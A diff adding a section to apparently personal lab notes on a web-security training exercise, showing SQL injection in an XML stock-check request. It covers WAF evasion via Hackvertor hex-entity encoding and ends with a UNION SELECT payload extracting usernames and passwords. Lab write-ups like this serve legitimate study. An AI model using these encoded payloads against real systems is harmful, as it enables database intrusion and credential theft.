@@ -231,3 +231,60 @@ Run the script
 ```
 python3.9 blind-conditional-script-3.py
 ```
+
+## SQL injection with filter bypass via XML encoding
+
+```
+POST /product/stock HTTP/2
+...
+
+<?xml version="1.0" encoding="UTF-8"?>
+    <stockCheck>
+        <productId>
+            2'--
+        </productId>
+        <storeId>
+            2
+        </storeId>
+    </stockCheck>
+```
+Respond with `"Attack detected"`
+
+Those two respond with the same value. So it is being evaluated
+```
+<storeId>
+    1+1
+</storeId>
+```
+
+```
+<storeId>
+    2
+</storeId>
+```
+
+Using `Hackvertor` we can bypass WAF and ensure we have SQL Iinjection:
+```
+<storeId>
+    <@hex_entities>2 and 1=1<@/hex_entities>
+</storeId>
+```
+```
+<storeId>
+    <@hex_entities>2 and 1=2<@/hex_entities>
+</storeId>
+```
+
+Solution:
+```
+<storeId>
+    <@hex_entities>2 union select username||'~'||password from users<@/hex_entities>
+</storeId>
+```
+
+What `Hackvertor` does with its tags:
+```
+<storeId>
+    &#x32;&#x20;&#x75;&#x6e;&#x69;&#x6f;&#x6e;&#x20;&#x73;&#x65;&#x6c;&#x65;&#x63;&#x74;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x64;&#x20;&#x66;&#x72;&#x6f;&#x6d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;
+</storeId>
+```
